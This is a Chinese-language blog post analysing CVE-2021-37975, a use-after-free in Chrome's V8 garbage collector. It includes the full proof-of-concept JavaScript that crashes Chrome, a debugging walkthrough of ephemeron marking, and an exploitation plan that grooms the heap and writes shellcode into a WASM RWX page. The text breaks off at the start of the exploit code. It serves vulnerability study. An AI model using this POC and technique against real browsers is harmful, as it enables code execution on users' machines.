<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>分析 CVE-2021-37975 | PwnTips</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="分析 CVE-2021-37975" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="继续分析 Chrome 在野利用，这次分析 CVE-2021-37975，这个漏洞是 GC 组件中的代码逻辑问题，可以导致释放后重利用。正好通过分析这个漏洞了解一下 v8 的 GC 实现，以及释放后重利用漏洞的利用策略。" />
<meta property="og:description" content="继续分析 Chrome 在野利用，这次分析 CVE-2021-37975，这个漏洞是 GC 组件中的代码逻辑问题，可以导致释放后重利用。正好通过分析这个漏洞了解一下 v8 的 GC 实现，以及释放后重利用漏洞的利用策略。" />
<link rel="canonical" href="https://pwntips.github.io/2022/05/18/CVE-2021-37975.html" />
<meta property="og:url" content="https://pwntips.github.io/2022/05/18/CVE-2021-37975.html" />
<meta property="og:site_name" content="PwnTips" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-05-18T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="分析 CVE-2021-37975" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-18T00:00:00+08:00","datePublished":"2022-05-18T00:00:00+08:00","description":"继续分析 Chrome 在野利用，这次分析 CVE-2021-37975，这个漏洞是 GC 组件中的代码逻辑问题，可以导致释放后重利用。正好通过分析这个漏洞了解一下 v8 的 GC 实现，以及释放后重利用漏洞的利用策略。","headline":"分析 CVE-2021-37975","mainEntityOfPage":{"@type":"WebPage","@id":"https://pwntips.github.io/2022/05/18/CVE-2021-37975.html"},"url":"https://pwntips.github.io/2022/05/18/CVE-2021-37975.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://pwntips.github.io/feed.xml" title="PwnTips" /><script async src="https://www.googletagmanager.com/gtag/js?id=G-LDS6Z1TT65"></script>
<script>
  window['ga-disable-G-LDS6Z1TT65'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){window.dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-LDS6Z1TT65');
</script>

</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">PwnTips</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">分析 CVE-2021-37975</h1>
    <p class="post-meta"><time class="dt-published" datetime="2022-05-18T00:00:00+08:00" itemprop="datePublished">
        May 18, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>继续分析 Chrome 在野利用，这次分析 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html">CVE-2021-37975</a>，这个漏洞是 GC 组件中的代码逻辑问题，可以导致释放后重利用。正好通过分析这个漏洞了解一下 v8 的 GC 实现，以及释放后重利用漏洞的利用策略。</p>

<h2 id="复现">复现</h2>

<p>阅读<a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html">报告</a>得知低于 94.0.4606.71 的 Chrome 受此漏洞影响，搜索 <a href="https://chromereleases.googleblog.com/2021/09/">2021 年 9月 的 Chrome 发布记录</a> 找到 94.0.4606.61，从源码构建出此版本 Chrome。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git fetch --depth 1 `
https://chromium.googlesource.com/chromium/src.git `
+refs/tags/94.0.4606.61:chromium_94.0.4606.61

git checkout tags/94.0.4606.61
gclient sync -v
gclient sync --with_branch_heads
gclient runhooks
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gn args out/CVE-2021-37975
ninja -C out/CVE-2021-37975 chrome
</code></pre></div></div>

<hr />
<p><strong>ℹ️NOTE</strong>: sync 过程中我遇到了 v8 rebase 冲突的问题，没找到导致冲突的原因，只好采用比较笨的办法，把 v8 目录删掉后重新运行 <code class="language-plaintext highlighter-rouge">gclient sync -v</code>，这样 gclient 新同步了一份 v8 代码就可以了。</p>

<hr />

<p>提取报告中的 POC 代码，用 <code class="language-plaintext highlighter-rouge">python -m http.server</code> 搭建一个可以触发漏洞的本地站点。</p>

<pre><code class="language-JavaScript">// poc.js

var initKey = {init : 1};
var level = 4;
var map1 = new WeakMap();

function hideWeakMap(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i &lt; level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = {'h' : i};
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      let retMap = new WeakMap();
      map.set(thisKey, retMap);
      return thisKey;
    }
  }
}

function getHiddenKey(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i &lt; level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      return thisKey;
    }
  }
}

function setUpWeakMap(map) {
  let hk = hideWeakMap(map, level, initKey);
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap();
  let map8 = new WeakMap();
  let k5 = {k5 : 1};
  let map5 = new WeakMap();
  let k7 = {k7 : 1};
  let k9 = {k9 : 1};
  let k8 = {k8 : 1};
  let v9 = {};
  map.set(k7, map7);
  map.set(k9, v9);
  hiddenMap.set(k5, map5);
  hiddenMap.set(hk, k5);
  map5.set(hk, k7);
  map7.set(k8, map8);
  map7.set(k7, k8);
  map8.set(k8,k9);
  
}

function main() {
    setUpWeakMap(map1);

    new ArrayBuffer(0x7fe00000);
    let hiddenKey = getHiddenKey(map1, level, initKey);
    let hiddenMap = map1.get(hiddenKey);
    let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
    let k8 = map1.get(k7).get(k7);
    let map8 = map1.get(k7).get(k8);

    console.log(map1.get(map8.get(k8)));
}

while (true) {
  try {
    main();
  } catch (err) {}
}
</code></pre>

<pre><code class="language-HTML">&lt;!--index.html--&gt;
&lt;html&gt;
&lt;body&gt;
&lt;script src="./poc.js"&gt;&lt;/script&gt;
CVE-2021-37979
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>Chrome 访问 http://localhost:8000 后崩溃。</p>

<h2 id="分析">分析</h2>
<hr />

<p><strong>ℹ️NOTE</strong>: 在对漏洞有了基本了解后，我并没有继续看报告中余下的分析，而是把这次的分析当做一个练习题，先尝试自己分析，再进行不下去的时候再去漏洞报告中看寻找提示，所以下面的分析走了不少“弯路”。</p>

<hr />

<p>阅读报告得知漏洞是出现在 GC 组件，先搜了一篇 v8 GC 的介绍：</p>

<ul>
  <li>https://v8.dev/blog/trash-talk</li>
</ul>

<p>看完以后得到以下信息：</p>

<ul>
  <li>v8 使用了分代（Generation）回收的策略：
    <ul>
      <li>内存分成了 Newspace 和 Oldspace 两个空间，新创建的对象先从 Newspace 申请内存，在 GC 时可以被提升（移动）到 OldSpace。</li>
      <li>GC 策略有为 Scavenger (Minor-GC) 和 Mark-Sweep-Compact (Major-GC) 两种
        <ul>
          <li>Scavenger 仅对 Newspace 进行回收，使用的是 <a href="https://en.wikipedia.org/wiki/Cheney%27s_algorithm">Cheney’s 算法</a>：把 Newspace 分割成 From 和 To 两个半空间（Semispace），仅从 From 分配内存，To 预留不用，在 From 内存用光时，启动 Sacvenger 垃圾回收，交换 From 和 To 的指向，把存活对象都拷贝到新的 From。</li>
          <li>Mark-Sweep-Compact 算法是对整个堆进行回收：从预先定义的根集（Roots）开始，用<a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection#Tri-color_marking">三色标记</a>法追踪存活对象。标记完成后，遍历所有页面，将 New Space 的对象，移动到 Old Space，标记 Oldspace 中的空闲的内存块，按需整理内存碎片。</li>
          <li>这种策略是基于这样的场景：大部分对象的生命周期很短，Newspace 中的对象创建之后很快就被丢弃了，需要频繁的进行 GC 检查。Oldspace 中都是存活一定时间后的对象，倾向于稳定，不需要经常的进行 GC 检查。</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="分析-pocjs">分析 poc.js</h3>

<p>有了基本的了解以后，开始调试程序。Visual Studio 附加调试 Chrome.exe，开启<a href="https://marketplace.visualstudio.com/items?itemName=vsdbgplat.MicrosoftChildProcessDebuggingPowerTool">子进程调试</a>选项，附加成功后新建标签页访问 POC 页面，触发崩溃。</p>

<p>查看调用栈，得知崩溃是发生在 <code class="language-plaintext highlighter-rouge">console.log</code> 函数中，异常原因是访问了无效的内存地址，这应该就是使用被释放内存的地方，POC 中只有一处 <code class="language-plaintext highlighter-rouge">console.log</code> 调用，被释放的对象应该就是 <code class="language-plaintext highlighter-rouge">console.log</code> 的参数。</p>

<p>用 Chrome 的开发者工具分步调试 poc.js 代码，查找 <code class="language-plaintext highlighter-rouge">console.log</code> 的参数的来源。</p>

<h4 id="hideweakmap">hideWeakMap</h4>

<p>先分析 <code class="language-plaintext highlighter-rouge">hideWeakMap</code> 函数，修改下 poc.js 让调试更方便：</p>

<ul>
  <li>这部分仅调试 <code class="language-plaintext highlighter-rouge">setUpWeakMap(map1)</code> 就够了，注释掉无关部分，这样就可以调试 <code class="language-plaintext highlighter-rouge">hideWeakMap</code> 而又不触发崩溃</li>
  <li>在 <code class="language-plaintext highlighter-rouge">hideWeakMap</code> 开头插入 <code class="language-plaintext highlighter-rouge">debugger;</code> 语句制造断点。</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">setUpWeakMap</code> 创建了一组对象，还创建了一组 WeakMap 把它们串到一起，WeakMap 这种数据结构我之前没使用过，从 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap#why_weakmap">MDN</a> 了解到它是一种特殊的 Map，主要特性是它的键只能是对象且都是弱引用。这样一来 WeakMap 的键不被其他对象引用时，就会被垃圾回收，键被垃圾回收后，值的引用也会失效。</p>

<p>函数主体是执行 <code class="language-plaintext highlighter-rouge">level</code> 轮的 for 循环，每轮操作如下：</p>

<ol>
  <li>新建对象 thisMap[i]，thisKey[i]，后面简写成 m_i, k_i。</li>
  <li>把本轮的 m_i 和 上一轮的 m_i-1 用上一轮的 k_i-1 关联起来： m_i-1[k_i-1] =&gt; m_i。</li>
  <li>把本轮的 k_i 和 m_i 用上一轮的 k_i-1 关联起来： m_i[k_i-1] =&gt; k_i</li>
  <li>综合上面两条， m_i： { k_i =&gt; m_i+1, k_i-1 =&gt; k_i }，其中 k_i =&gt; m_i+1 是第 i+1 轮循环执行 2 时设置的。</li>
  <li>对于最后一轮循环的 m_i，没有第 i+1 轮循环来设置其 k_i，所以它只有 k_i-1 一个键：{ k_i-1 =&gt; k_i }</li>
  <li>第一轮循环（i=0）时全局量 map1 和 initKey 相当于 m_-1 和 k_-1</li>
  <li>最后一轮额外创建一个空的 retMap，将 retMap 以 k_level-1 为键关联到 map1</li>
</ol>

<p>本次调用传入的 level 值为 4，函数返回后，相关变量状态如下：</p>

<ul>
  <li>map1 适用规则 6、7，得到 { initKey =&gt; m_0, k_3 =&gt; retMap }</li>
  <li>m_0 适用规则 6，得到 { initKey =&gt; k_0, k_0 =&gt; m_1 }</li>
  <li>m_1、m_2 适用规则 4，得到 { k_1 =&gt; m_2, k_0 =&gt; k_1 }、{ k_2 =&gt; m_3, k_1 =&gt; k_2 }</li>
  <li>m_3 适用规则 5，得到 { k_2 =&gt; k_3 }</li>
  <li>返回值是循环最后一轮的 k_3</li>
</ul>

<p>函数返回时，对象关系如下图：</p>

<p><img src="/assets/images/Pasted image 20220613171237.png" alt="" /></p>

<h4 id="setupweakmap">setUpWeakMap</h4>

<p><code class="language-plaintext highlighter-rouge">hideWeakMap</code> 执行完毕后，返回到 <code class="language-plaintext highlighter-rouge">setUpWeakMap</code>：</p>

<ul>
  <li>返回值 <code class="language-plaintext highlighter-rouge">hk</code> 就是 k_3，那么 <code class="language-plaintext highlighter-rouge">hiddenMap</code> 是 <code class="language-plaintext highlighter-rouge">retMap</code></li>
  <li>创建 map5、map7、map8、map9、k5、k7、k8、k9、v9。为了统一符号，后面简写成 map_n、k_n、v_n</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">setUpWeakMap</code> 返回时，对象关系扩充成：</p>

<p><img src="/assets/images/Pasted image 20220613171409.png" alt="" /></p>

<h4 id="main">main</h4>

<p>完成上面的操作后，程序返回到 <code class="language-plaintext highlighter-rouge">main</code> 函数：</p>

<ul>
  <li>申请超大的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code></li>
  <li>调用 <code class="language-plaintext highlighter-rouge">getHiddenKey</code> 获取到了 k_3 存入 <code class="language-plaintext highlighter-rouge">hiddentKey</code></li>
  <li>利用 k_3 从 map1 取得了 retMap 存入 <code class="language-plaintext highlighter-rouge">hiddenMap</code></li>
  <li>从 retMap 中取到 k_7：
    <ul>
      <li><code class="language-plaintext highlighter-rouge">k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey)</code></li>
      <li>=&gt; k7 = retMap[ retMap[k_3] ][k_3]</li>
      <li>=&gt; retMap[k_5][k_3]</li>
      <li>=&gt; m_5[k_3]</li>
      <li>=&gt; k_7</li>
    </ul>
  </li>
  <li>从 map1 取到 k_8：map1[k_7][k_7] =&gt; m_7[k_7] =&gt; k_8</li>
  <li>从 map1 取到 m_8：map1[k_7][k_8] =&gt; m_7[k_8] =&gt; m_8</li>
  <li>从 map1 取到 v9，然后用 console.log 输出：map1[ map8[k_8] ] =&gt; map1[k_9] =&gt; v9</li>
</ul>

<h4 id="引用关系">引用关系</h4>

<p>有了基本的了解，我们从被释放的对象 v9 开始，反着梳理一下引用关系，总结出一个引用关系图：</p>

<p><img src="assets/images/Pasted image 20220613171554.png" alt="" /></p>

<ul>
  <li>带数字标注的实线边，代表 WeakMap 的键值关系，如果边的起点代表的键被 GC 回收了，那么边的终点也不再有效了。标号是从 v9 开始的指向层数，例如，指向 v9 的边 map1[k_9] -&gt; v9 是第 0 层，要保证 v9 不被回收，则指向 k_9 和 map1 的边 ROOT -&gt; map1 和 m_8[k_8] -&gt; k_9 是就必须有效，这两个边是第一层，再往上指向 m_8 和 k_8 的边 m_7[k_8] -&gt; m_8，m_7[k_7] -&gt; k_8 是必须有效（ROOT 比较特殊，它是一直有效的），这就是第二层。</li>
  <li>不带标号的虚线，把对象和把它作为键的地方关联起来。带菱形箭头的一边是对象的值，另一边代表 WeakMap 使用此对象作为键的位置，根据 WeakMap 的特向，当对象被 GC 回收后， 使用它作为键的地方也不再有效。</li>
  <li>Roots 可以看做一个包含所有全局对象的数组</li>
</ul>

<h4 id="while-循环">while 循环</h4>

<p>剩下的部分就是一个 <code class="language-plaintext highlighter-rouge">while(true)</code> ，循环调用 <code class="language-plaintext highlighter-rouge">main</code> 函数并且忽略所有异常。</p>

<h3 id="调试-gc">调试 GC</h3>

<p>通过上面的分析，我推测是 GC 的存活分析出现了问题，误把存活的对象，当做不再被引用的对象回收了。而且 POC 大量使用了 WeakMap，很可能是与 WeakMap 相关的 GC 逻辑，我带着这个推测开始调试 GC 的过程。</p>

<p>先调一下 Scavenger，在源码中搜索 Scavenger 关键字，搜索结果中找到 <code class="language-plaintext highlighter-rouge">ScavengerCollector</code> 类，大致浏览此类找到 <code class="language-plaintext highlighter-rouge">ScavengerCollector::CollectGarbage</code> 函数，根据此函数的引用上下文，推测这个就是执行 Scavenger 算法的函数。编写测试页面验证推测：测试页循环执行 <code class="language-plaintext highlighter-rouge">obj = new Object()</code> 申请大量对象触发 Scavenger GC，Chrome 访问测试页面后，确实可以触发断点，粗略调试函数也有同样的结果。确认后就可以调试 POC 的 Scavenger 流程了，在 POC 开头加入 <code class="language-plaintext highlighter-rouge">alert</code>，待 <code class="language-plaintext highlighter-rouge">alert</code> 弹出后，启用 Scavenger 的断点，点掉弹窗让代码继续运行，发现页面直接崩溃了，断点并不会断下。检查后确认断点没问题，就是没有执行到相关代码。</p>

<p>看来漏洞并不在 Scavenger 组件，分析脚本的 GC 操作的调用栈，找到更上层的 GC 启动逻辑 <code class="language-plaintext highlighter-rouge">Heap::PerformGarbageCollection</code> 。下好断点后，再次访问 POC 页面，这次可以断下，查看调用栈发现是在申请 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的地方，单步跟下去确实跟到了 Mark-Sweep-Compactor 垃圾回收器，看来 POC 中 <code class="language-plaintext highlighter-rouge">new ArrayBuffer(0x7fe00000);</code> 就是用来触发 GC 的。</p>

<hr />
<p><strong>ℹ️NOTE</strong>: <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 申请失败会触发 GC，<code class="language-plaintext highlighter-rouge">0x7fe00000</code> 这个值太大了超过了能申请的最大值，一定会申请失败。</p>

<hr />

<p>接下来我反复调试了 Mark-Sweep-Compact 垃圾回收的过程，重点关注 WeakMap 对象相关的 GC 策略，发现如下：</p>

<p>Mark-Sweep-Compact 大致可以分为标记和回收两步：</p>

<ul>
  <li>标记：从包含全局量、栈等位置的根集开始，以广度优先的顺序，对存活对象进行标记。标记采用的是<a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection#Tri-color_marking">三色标记法</a>，标记结果以位图的形式存放在内存块头中。</li>
  <li>回收：根据标记结果，把空闲内存回收，回收过程中，如果有必要还会对 Oldspace 进行整理，减少内存碎片。</li>
</ul>

<hr />
<p><strong>ℹ️NOTE</strong>: 可以用 <code class="language-plaintext highlighter-rouge">chrome.exe --no-sandbox --js-flags="--no-parallel_marking"</code> 命令行，关闭并发标记，简化这部分调试工作。</p>

<hr />

<p>标记阶段与 <code class="language-plaintext highlighter-rouge">WeakMap</code> 相关的动作：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">WeakMap</code> (<code class="language-plaintext highlighter-rouge">v8::internal::JSWeakMap</code>)：<code class="language-plaintext highlighter-rouge">WeakMap</code> 内部有一个指向 <code class="language-plaintext highlighter-rouge">EphemoronTable</code> 结构的指针，对它的标记动作是把 <code class="language-plaintext highlighter-rouge">EphemoronTable</code> 标记成灰色，并加入工作队列。详见 <code class="language-plaintext highlighter-rouge">MarkingVisitorBase&lt;..&gt;::VisitJSWeakCollection</code>。</li>
  <li><code class="language-plaintext highlighter-rouge">EphemeronTable</code>：WeapMap 中的 Key-Value 对在 GC 中被叫做 ephemoron，存储在<code class="language-plaintext highlighter-rouge">EphemeronTable</code> 结构中。
  对它的标记操作：
    <ul>
      <li>先会把它记录到 <code class="language-plaintext highlighter-rouge">ephemeron_hash_tables</code>，这样标记完成后 <code class="language-plaintext highlighter-rouge">ephemeron_hash_tables</code> 中就包含所有的 <code class="language-plaintext highlighter-rouge">EphemeronTable</code>。</li>
      <li>之后遍历它内部存储的 Key-Value 对，如果 Key 是灰色或黑色，则把 Value 标记为灰色，加入工作队列。如果 Key 和 Value 都是白色，则把 Key-Value 对加入 <code class="language-plaintext highlighter-rouge">discovered_ephemorons</code> 队列。这是因为当前还有对象没有处理完，Key 的颜色后续还可能会发生变化，要等其他的对象都处理完成后才能确定。可以看到 WeakMap 中存储的 。</li>
    </ul>
  </li>
</ul>

<p>在整个标记阶段的末尾，在其他对象都处理完成后，还会专门对 Ephemerons 进行一轮最终的处理，循环标记 Ephemerons 直到状态不再变化：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">next_ephemerons</code> 队列的所有元素移动到 <code class="language-plaintext highlighter-rouge">current_ephemerons</code> 队列</li>
  <li>遍历 <code class="language-plaintext highlighter-rouge">current_ephemorons</code> 中的所有 Ephemeron。如果 Key 已经变成黑/灰了， 就把 Value 标记为灰色，加入工作队列。否则就放回 <code class="language-plaintext highlighter-rouge">next_ephemerons</code> 队列，下轮继续处理。</li>
  <li>处理工作队列中所有对象</li>
  <li>遍历 <code class="language-plaintext highlighter-rouge">discovered_ephemorons</code> 处理新发现的 Ephemeron，也是发现黑色/灰色的 Key 就把 Value 标记为灰色，加入工作队列，如果 Key，Value 都是白色，则加入 <code class="language-plaintext highlighter-rouge">next_ephemerons</code> 集合</li>
  <li>如果本轮循环，既没有发现 <code class="language-plaintext highlighter-rouge">current_ephemerons</code> 队列的变化，又没有新增 <code class="language-plaintext highlighter-rouge">discovered_ephemerons</code> 队列，则处理完成，跳出循环。</li>
</ul>

<p>回收阶段会把标记过的存活对象进行移动，从 New Space 移动到 Old Space。多次调试后，我发现移动操作完成后，map1 中有几个对象没被移动，也正是访问这些值的操作触发了崩溃。根据我前面分析出的引用关系，map1 中所有的值都是存活的，都该被移动到 Old 空间，标记阶段漏标的值应该就是这里了。</p>

<p>漏标的值是 WeakMap 中存储的，所以推测是循环处理 Ephemerons 的地方出了问题，重点对这块进行调试后发现，Ephemerons 处理的完成条件是有问题的，可能出现 map1 中存储的 v_9 还未被标记，循环就已经满足条件退出的情况，最终 v_9 被当做垃圾回收了。GC 完成后虽然 v_9 已经被释放掉了，还可以从 map_1 中读取到它的指针，继续访问被释放的内存。</p>

<h2 id="利用">利用</h2>

<p>接下来编写利用代码，思路如下：</p>

<ul>
  <li>在 Old Space 构造出 0x30, 0x40 两种大小的空闲内存空洞：
    <ul>
      <li>创建多个包含 5 个元素的 Double 数组</li>
      <li>创建多个包含 6 个元素的 Double 数组</li>
      <li>触发 GC 把数组移动到 Oldspace</li>
      <li>再利用数据的 Push 函数，把上面两种数组都扩充成 8 个元素。这样数组的旧缓冲区 （<code class="language-plaintext highlighter-rouge">FixedArray</code>) 会被释放掉在，产生 0x30, 0x40 两种空闲内存块。</li>
    </ul>
  </li>
  <li>申请多个 5 元素的 Double 数据，触发 GC，数组的 <code class="language-plaintext highlighter-rouge">JSArray</code> 就会被移动到 0x30 的空洞中，每个 0x30 的空闲块中可以填入 3 个 <code class="language-plaintext highlighter-rouge">JSArray</code>(0x10)，缓冲区（<code class="language-plaintext highlighter-rouge">FixedArray</code>）被移动到 0x40 的空洞中，把所有这些数组都存放入一个全局数组 <code class="language-plaintext highlighter-rouge">arrs</code> 中。</li>
  <li>创建多个 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code></li>
  <li>把 v9 替换成第二步中使用的 <code class="language-plaintext highlighter-rouge">arrs</code> 数组，之后把 <code class="language-plaintext highlighter-rouge">arrs</code> 置为空。</li>
  <li>触发漏洞，<code class="language-plaintext highlighter-rouge">arrs</code> 数组会被释放掉，数组所在的位置又变成了空闲内存块，<code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 对象有可能被移动到 0x40 空闲块中，而 0x30 的空闲块可能没有被分配。</li>
  <li>通过漏洞还是可以访问到 <code class="language-plaintext highlighter-rouge">arrs</code> 数组，由于 Double 数组的缓冲区（0x40 的块）已经被填入了 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，利用 <code class="language-plaintext highlighter-rouge">arrs</code> 就可以读/写 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的内容。</li>
  <li>读取到 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 backing_storage，就可以使用 <a href="/2022/05/26/CVE-2019-13720.html">CVE-2019-13720</a> 类似的技术，新创建一个 FileReaderLoader 并从 FastMallocPartitionRoot 获取到它的地址，又通过此对象读取到与其关联的 FileReader 以及其 WASM 函数的 RWX 内存块的地址。</li>
  <li>修改 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 backing_store 和长度，就可以把 shellcode 拷贝到上一步创建的 RWX 内存块中，作为 WASM 导出函数执行。</li>
</ul>

<h3 id="稳定-oldspace">稳定 Oldspace</h3>

<p>多次改写利用代码后，我发现要想稳定利用 UAF 型漏洞，就要控制好 Oldspace 的状态。每次 Major-GC 过程中 Sweep, Evacuation 都可能改变 Oldspace 的状态，先了解这两个步骤。</p>

<h4 id="sweep">Sweep</h4>

<p>Sweep 是根据标记结果，回收页面中的空闲内存，将其插入空闲表的过程：</p>

<ul>
  <li>在 Major GC 中 Sweep 是按需进行的，不是一下 Sweep Oldspace 所有的页面，而是每次内存不够用时，回收一个页面的，待 GC 完成的时候，如果有没回收的页面，就交给后台线程去继续回收。</li>
  <li>根据之前标记的存活信息，把所有页面根据存活数据的大小进行排序，先回收存活数据量少的页面。</li>
  <li>依照标记存活信息，找到存活对象之外的空闲块，在空闲块上创建代表空闲块的特殊对象，链入所在页面的空闲表。</li>
  <li>有三种不同类型的对象都可以表示空闲内存，它们的不同之处是内存块的大小：
    <ul>
      <li>如果只有 4 字节就是 OnePointerFiller</li>
      <li>有 8 字节是 TwoPointerFiller</li>
      <li>如果超过 8 字节，就是 FreeSpace：
        <ul>
          <li>FreeSpace
            <ul>
              <li>0x00 map</li>
              <li>0x04 size: Smi</li>
              <li>0x08 next: TaggedPtr</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>空闲表总共有 24 个，每个都容纳不同大小的空闲内存块，例如，第一个存储小于 24 的，第二个里面存储 [24, 32) 的。
```cpp</li>
</ul>

<p>static constexpr unsigned int categories_min[kNumberOfCategories] = {
		      24,  32,  48,  64,  80,  96,   112,  128,  144,  160,   176,   192,
		      208, 224, 240, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
#### Evacuation

Major-GC 会选择 Newspace 中所有页面和部分 Oldspace 的页面，形成一个页面的集合，逐个遍历这些页面，把页面中的对象移动到其他地方：

- 发现一个新对象，就从 Oldspace 申请对应大小的内存，把对象移动过去。也就是说 Newspace 的对象移动到 Oldspace, Oldspace 中的对象移动到 Oldspace 的其他页面
- Oldspace 的内存申请可以细分为多个层级：
	- 先从 Oldspace 的线性分配区申请
	- 线性分配区剩余内存不足时，就把线性分配区释放，从空闲表中申请 FreeSpace 作为新线性分配区，空闲表根据内存块大小分组存放，先尝试最接近目标内存大小，之后再依次尝试更大的，直到最大的空闲内存块
	- 当空闲链表内存不足时，尝试查找已经 Sweep 完成但是没有加入空闲链表的页面，把页面内的所有 FreeSpace 插入空闲链表
	- 如果没有找到这样的页面，就尝试 Sweep 新页面
	- 如果 Sweep 新页面也不能满足，就申请新的页面。
- 从 Oldspace 选取的是存活数据占比较低的页面，以达到整理内存碎片的作用：
	- Oldspace 所有页面按照存活数据大小进行排序，将存活数据量最小的几个页面作为候选页面
	- Oldspace 中有一个特殊的页面，它的大小连其他正常页面的一半都不到，这个页面不会被 Evacuation，但是会影响页面的排序和新页面的申请。
		- 当最空闲的页面，已经分配过半，下次 GC 时，它就会被排序到特殊页面之后，Sweep 先尝试的就是特殊页面，如果特殊页面几乎是满的，Sweep 就会失败，申请一个新页面出来
		- 新的页面填入的数据如果没有特殊页面大，下次 GC 就会将其排序到特殊页面前，Evacuation 会把，特殊页面前后的两个页面中的对象合并到一个新页面中，达到了整理内存碎片的效果。
	- 计算所有 Evaculation 候选页面中已用内存的和，预估 Evaculation 完成后这些对象所需的页面数量。如果对 Oldspace 的 Evaculation 并不能减少 Oldspace 页面使用量，则不会进行 Evaculation。


#### 代码实现

稳定的利用，就需要：

- 0x30, 0x40 空闲块所在的页面的总是第一个被 Sweep，这样才能让 Newspace 的对象，被移动到事先准备的空闲块中。
- 0x30, 0x40 空闲块所在的页面不被 Evacuation，因为 Evacuation 会破坏布局好的空闲块。

经过实验，我发现在利用的开头，先用 Double 数组申请大量的 0x10 的内存块，可以让 Oldspace 达到一个较稳定的状态，这个时候 Oldspace 总共有 5 个页面，4 个容量为 0x40000，剩下 1 个为 0x15000。其中 4 个已经被填满了，只剩下一个 0x40000 容量的页面仅有 0xC000 左右的内存被分配。这就使得整个利用期间，此页面的已分配内存总是最小的，每次 Sweep 都是在这个页面进行，而且由于其他页面都是满的，Evaculation 并不能减少总的页面用量，也不会有 Evacuation 来影响内存布局。

内存布局示例：

- 0x00006a7508140000，大小：0x40000，已分配：0x3d134
- 0x00006a7508200000，大小：0x40000，已分配：0x386c0
- 0x00006a7508040000，大小：0x40000，已分配：0x32b7c
- 0x00006a75081c0000，大小：0x15000，已分配：0x128ac
- 0x00006a7508280000，大小：0x40000，已分配：0xc550

这样整个利用期间新对象的申请释放，大多是在页面 0x00006a7508280000 上进行的，其他页面的状态不会变化。

```javascript
const predict_free_space = Math.floor(0x3d000 * 0.9);
let occupy = null;
const sizeOfArr = 0x10 + 2 * 0x8 + 0x4;
function AllocateNewPage() {
